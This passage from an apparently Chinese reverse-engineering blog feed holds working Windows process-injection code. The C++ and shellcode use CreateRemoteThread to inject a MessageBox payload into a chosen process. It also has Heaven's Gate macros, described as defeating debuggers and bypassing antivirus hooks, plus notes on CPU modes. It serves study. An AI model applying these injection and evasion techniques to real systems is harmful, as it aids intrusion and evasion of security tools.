class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">DWORD64 pLoadLibraryA;</span><br><span class="line">DWORD64 pGetProcAddress;</span><br><span class="line">DWORD64 pMassage;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">writeMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID pReadyToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPVOID pMassage = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!pMassage)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;申请内存失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> bytewritten;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pMassage, pReadyToWrite, size, &amp;bytewritten);</span><br><span class="line"><span class="keyword">if</span> (bytewritten != size)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;写入字节失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[+] 写入成功&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pMassage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">code</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">targetCode</span><span class="params">(Data* data)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> user32[] = &#123; <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="type">char</span> messageBox[] = &#123; <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">HMODULE hModule = ((<span class="built_in">HMODULE</span>(*)(<span class="type">char</span>*))(data-&gt;pLoadLibraryA))(user32);</span><br><span class="line"><span class="keyword">if</span> (!hModule)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID pMessagebox = ((<span class="built_in">FARPROC</span>(*)(HMODULE, LPCSTR))(data-&gt;pGetProcAddress))(hModule, messageBox);</span><br><span class="line">((<span class="built_in">int</span> (*)(HWND, LPCSTR, LPCSTR, UINT))pMessagebox)(<span class="literal">NULL</span>, (<span class="type">char</span>*)(data-&gt;pMassage), (<span class="type">char</span>*)(data-&gt;pMassage), MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取目标句柄</span></span><br><span class="line"><span class="comment">//申请空间，写入参数</span></span><br><span class="line"><span class="comment">//申请空间写入函数</span></span><br><span class="line"><span class="comment">//远程线程执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCode</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;SUCCESS&quot;</span>;</span><br><span class="line">LPVOID pMessage = <span class="built_in">writeMemory</span>(hProcess, message, <span class="built_in">sizeof</span>(message) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data.pMassage = (DWORD64)pMessage;</span><br><span class="line">data.pGetProcAddress = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">data.pLoadLibraryA = (DWORD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID pData = <span class="built_in">writeMemory</span>(hProcess, &amp;data, <span class="built_in">sizeof</span>(data) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> funcSize = (<span class="type">uintptr_t</span>)writeMemory - (<span class="type">uintptr_t</span>)targetCode;</span><br><span class="line"></span><br><span class="line">LPVOID pfunc = <span class="built_in">writeMemory</span>(hProcess, (PVOID)targetCode, funcSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pfunc, pData, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCode</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中targetCode是写入进程的函数，<br>uintptr_t funcSize &#x3D; (uintptr_t)writeMemory - (uintptr_t)targetCode;的原因是我编译之后看了一下反编译结果，发现是这两个函数挨在一起，那么首地址相减就是大小了。</p><h2 id="实践ASM"><a href="#实践ASM" class="headerlink" title="实践ASM"></a>实践ASM</h2><p>实际上，一般来说，代码注入都是注入汇编代码，因为汇编代码可以更方便地和寄存器，内存空间进行交互</p><p>如果要直接用汇编来完成操作，步骤为：</p><p>将执行的函数写为shellcode，然后创建远程线程执行，这里可以直接把数据和代码写在一起传递</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">jmp code;</span></span><br><span class="line"><span class="string">user32:</span></span><br><span class="line"><span class="string">.asciz &quot;user32.dll&quot;;</span></span><br><span class="line"><span class="string">messageboxa:</span></span><br><span class="line"><span class="string">.asciz &quot;MessageBoxA&quot;;</span></span><br><span class="line"><span class="string">message:</span></span><br><span class="line"><span class="string">.asciz &quot;SUCCESS&quot;;</span></span><br><span class="line"><span class="string">pLoadLibraryA:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC9460;</span></span><br><span class="line"><span class="string">pGetProcessAddress:</span></span><br><span class="line"><span class="string">.quad 0x00007FFD20BC3C30;</span></span><br><span class="line"><span class="string">code:</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">lea rcx,[rip + rip - user32];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pLoadLibraryA];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">mov rcx,rax;</span></span><br><span class="line"><span class="string">lea rdx,[rip + rip - messageboxa];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pGetProcessAddress];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">lea rbx,[rip + rip - message];</span></span><br><span class="line"><span class="string">mov r9,1;</span></span><br><span class="line"><span class="string">mov r8,rbx;</span></span><br><span class="line"><span class="string">mov rdx,rbx;</span></span><br><span class="line"><span class="string">mov rcx, 0;</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pasm</span>(<span class="params">code_list</span>):</span><br><span class="line">    code_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code_str += <span class="string">&#x27;__asm&#123;\n&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> code_list:</span><br><span class="line">        code_str += <span class="string">f&quot;_emit 0x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>;\n&quot;</span></span><br><span class="line">    code_str += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(code_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">outcode,count = ks.asm(code)</span><br><span class="line"></span><br><span class="line">phex(outcode)</span><br><span class="line"><span class="comment"># pasm(outcode)</span></span><br></pre></td></tr></table></figure><p>这段汇编总能出现一些奇怪的bug，要注意栈平衡和调用函数时栈最后一位为0，lea和mov什么时候传值什么时候传地址，以及x64下的基本调用方式。不管我写没写后面的pop，程序都会崩溃不知道为什么，但是messagebox确实弹出了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCodeAsm</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">BYTE code[] = &#123; <span class="number">0xeb</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x2e</span>, <span class="number">0x64</span>, <span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x4d</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x6f</span>, <span class="number">0x78</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x94</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x3c</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x0d</span>, <span class="number">0xc8</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x15</span>, <span class="number">0xc0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xd5</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x1d</span>, <span class="number">0xbc</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd8</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0xc3</span> &#125;;</span><br><span class="line">LPVOID pcode = <span class="built_in">writeMemory</span>(hProcess, code, <span class="built_in">sizeof</span>(code));</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCodeAsm</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">本篇讲解基本的代码注入</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="代码注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>天堂之门研究</title>
    <link href="https://www.pri87.vip/posts/4ca4211.html"/>
    <id>https://www.pri87.vip/posts/4ca4211.html</id>
    <published>2024-12-29T13:49:43.000Z</published>
    <updated>2024-12-30T16:48:12.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="天堂之门"><a href="#天堂之门" class="headerlink" title="天堂之门"></a>天堂之门</h2><p>在32位进程中，调用32位系统函数的操作是通过WOW64实现的。WOW64在内部转换为64位，然后进行64位DLL的调用，从而实现了在64位机上兼容运行32位的操作。</p><p>在长模式下，段寄存器用作权限和标志的区分<br>使用WinDbg进行调试：</p><p>CS:23-&gt;gdt偏移:4*8 &#x3D; 20<br>CS:33-&gt;gdt偏移:6*8 &#x3D; 30</p><p><img src="https://s2.loli.net/2024/12/29/PhAFVyJl6iIqtLv.png" alt="image-20241229225553947"></p><p>可以看出23指向的段描述符的Long位为NL，而33指向的为Lo，说明33指向的是64位区域，23指向的是32位区域</p><p>对于不同的段选择子，CPU会选择对应的机器码解释方式去翻译机器码。<br>在软件上，有对应的32位函数实现32到64的转换然后进入64位的操作系统内核，因为(64位的操作系统一定是64位的，要执行内核代码必须先转为64位执行)</p><h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><p>基本调用流程：<br>32位进程调用32位系统API，其中系统API调用<code>dword ptr fs:[000000C0]</code>，即TEB表偏移C0的WOW32Reserved，第一行代码为jmp     0033:77877009，表明先切换为64位，然后跳转到77877009，位于wow64cpu.dll中，首先保存了环境堆栈，然后切换为64为的堆栈<br>最后通过<code>jmp     qword ptr [r15+rcx*8]</code>执行函数调用，r15为函数表，rcx为偏移</p><p>[<a href="https://bbs.kanxue.com/thread-221236.htm">分享][原创]汇编里看Wow64的原理（浅谈32位程序是怎样在windows 64上运行的？）-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>反调试：几乎所有调试器均不能正常调试切换后的代码<br>防钩子：如果杀软只对32位DLL执行了Hook，那么这个方法可以直接绕过32位入口直接调用64位函数。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X64  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm push 0x33       \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm add dword ptr [esp], 5 \</span></span><br><span class="line"><span class="meta">__asm retf            \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X86  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 <span class="comment">/* call $+5 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0xC7 <span class="comment">/* mov dword [rsp+4], 0x23 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x44 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x23 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x83 <span class="comment">/* add dword [rsp], 0xD */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x0D \</span></span><br><span class="line"><span class="meta">__asm _emit 0xCB <span class="comment">/* retf */</span> \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>切换为64位时，需要使用64位汇编的立即数，我感觉可以创建几个辅助的64位DLL帮我执行那些函数</p><p>对于反调试的作用，自然是已经实现了，如果要实现不使用WOW64去执行函数，需要以下操作：</p><ul><li>切换进程到64位</li><li>获取gs:[60h]得到PEB</li><li>遍历ldr的InMemoryOrderModuleList找到Ntdll64的模块地址</li><li>在Ntdll中获取需要的函数进行操作</li></ul><p>如果不是Ntdll中的函数，需要找到Ntdll中的LdrLoadDll函数，在64位中执行加载库函数操作，然后取函数地址并执行。</p><p>这个部分汇编写得太恶心了，之后再实现吧QAQ</p>]]></content>
    
    
    <summary type="html">一种反调试技术</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="反调试" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
    <category term="天堂之门" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E5%8F%8D%E8%B0%83%E8%AF%95/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="WOW64" scheme="https://www.pri87.vip/tags/WOW64/"/>
    
  </entry>
  
  <entry>
    <title>win-计算机启动时的模式过渡</title>
    <link href="https://www.pri87.vip/posts/bb94a573.html"/>
    <id>https://www.pri87.vip/posts/bb94a573.html</id>
    <published>2024-12-26T16:47:38.000Z</published>
    <updated>2024-12-30T16:45:35.081Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/673712331">第四章 处理器模式与硬件内存管理(x86_64) - 从零开始开发UEFI引导的64位操作系统内核 - 知乎</a></p><p>本文为上面这个网址的摘抄</p><p><img src="https://s2.loli.net/2024/12/27/Lzi1KnslSqB2hmu.png" alt="image-20241227011304326"></p><h2 id="几种模式"><a href="#几种模式" class="headerlink" title="几种模式"></a>几种模式</h2><h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h3><blockquote><p>处理位数被设为16位。在这个模式中，处理器只能访问物理地址的前1MB空间，通过段寄存器左移4位后与一个16位地址相加得到的20位地址访问。</p></blockquote><h3 id="32位实模式"><a href="#32位实模式" class="headerlink" title="32位实模式"></a>32位实模式</h3><blockquote><p>不开启保护模式的32位模式是不稳定的，处理器只能暂时处于<code>32位实模式</code>的状态，需要开启保护模式才能正常执行32位程序。</p></blockquote><h3 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h3><blockquote><p>准备保护模式数据结构后将<code>cr0</code>寄存器的<code>PE</code>标志位置位即可开启。这个“保护模式数据结构”指的是<code>GDT</code>，全局描述符表，表中可以添加<code>段描述符</code>、<code>系统描述符</code>。保护模式下的段寄存器通过访问<code>段描述符</code>确定所在的段，而不是左移4位后直接与地址相加；保护模式有许多硬件直接触发的保护功能，系统描述符用于支持这些功能的触发。此外，保护模式中引入了<code>特权级</code>，<code>0</code>为最高的特权级，<code>3</code>为最低的特权级，越高的特权级，保护功能越弱，程序越容易控制处理器的状态。内核通常在<code>0</code>特权级运行，普通程序通常在<code>3</code>特权级运行。同时，在这个模式中也引入了分页机制（不是必须开启）。32位的基本分页机制使用一级页表进行寻址，能够映射4GB空间，开启<code>PAE</code>后，在原先的以及页表上增加了两级页表，通过类似树状的数据结构使得相同大小的最高级页表能够映射<code>64PB</code>的空间。<code>PAE</code>开启后使用36位物理地址，使得物理地址寻址能力提高到了<code>64GB</code>。</p></blockquote><h3 id="长模式"><a href="#长模式" class="headerlink" title="长模式"></a>长模式</h3><blockquote><p>由<code>实模式</code>切换而来的<code>32位保护模式</code>被称为<code>IA-32</code>模式。由于64位模式仅仅是在<code>IA-32</code>模式基础上经过简单的功能增强和修改得到的，所以被称为<code>IA-32e</code>模式。</p><p>主要有这些功能：<code>分页机制</code>、<code>长模式地址扩展（LME）</code>、<code>64位段描述符</code>。<code>长模式地址扩展</code>中为分页机制又增加了一级或两级页表，使用4级或5级页表映射地址空间。同时使用48位物理地址，进一步提高物理地址寻址能力。也因为<code>48位物理地址</code>称为<code>长地址</code>，<code>IA-32e</code>模式又称<code>长模式</code>。由于描述符表中支持<code>32位段描述符</code>和<code>64位段描述符</code>同时存在，所以可以通过暂时关闭<code>LME</code>并修改段寄存器索引的段描述符，进入一种支持32位程序运行的<code>IA-32e</code>的子模式，称为<code>兼容模式</code>。虽然所谓的<code>兼容模式</code>只是<code>IA-32e</code>模式的一种支持32位程序运行的<strong>状态</strong>，但我们依然习惯地称<code>IA-32e的支持64位程序运行的状态</code>和<code>IA-32e的支持32位程序运行的状态</code>为<code>IA-32e</code>的两个子模式<code>长模式</code>和<code>兼容模式</code>。</p></blockquote><h2 id="内存布局"><a href="#内存布局" class="headerlink" 